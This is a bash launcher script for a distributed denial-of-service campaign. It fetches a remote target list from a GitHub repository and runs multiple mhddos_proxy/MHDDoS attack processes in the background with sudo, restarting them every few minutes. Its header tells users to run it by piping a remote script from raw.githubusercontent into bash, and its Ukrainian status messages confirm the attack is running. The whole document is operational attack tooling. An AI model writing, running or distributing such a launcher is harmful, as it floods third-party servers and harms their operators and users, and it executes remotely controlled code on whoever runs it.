#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)

##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.



## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
## By default (9m), can be passed as second parameter
restart_interval="9m"


#parameters that passed to python scrypt
rpc="--rpc 200"
proxy_interval="-p 600"

#Just in case kill previous copy of mhddos_proxy
sudo pkill -f ./start.py
sudo pkill -f runner.py



# Restart attacks and update targets list every 10 minutes (by default)
while [ 1 == 1 ]
#echo -e "#####################################\n"
do
   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
   
   echo -e "\nNumber of targets in list: " $list_size "\n"

   
      
   # Launch multiple mhddos_proxy instances with different targets.
   for (( i=1; i<=list_size; i++ ))
   do
            echo -e "\n I = $i"
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
           

            echo "full cmd:"
            echo "$cmd_line $proxy_interval $rpc"
            
            cd ~/mhddos_proxy
            nohup sudo python3 $cmd_line $proxy_interval $rpc </dev/null &>/dev/null &
            echo -e "Атаку розпочато успішно, не переймайтеся, що нічого не виводиться на екран – атака запущена у фоні, щоб вона не завершилася при закритті терміналу"
            echo -e "\nЯкщо цікаво можете у іншій вкладці подивитися через: \n ps aux | grep runner.py , що там запущенно\nАбо скачати: \n sudo apt install --upgrade htop \n, та у реальному часі дивития через: \n htop"
   done
   
   echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
   sleep $restart_interval
   clear
   echo -e "\nRESTARTING\nKilling old processes..."
   sudo pkill -f ./start.py
   sudo pkill -f runner.py
   echo -e "\nOld processes have been killed - starting new ones"
done
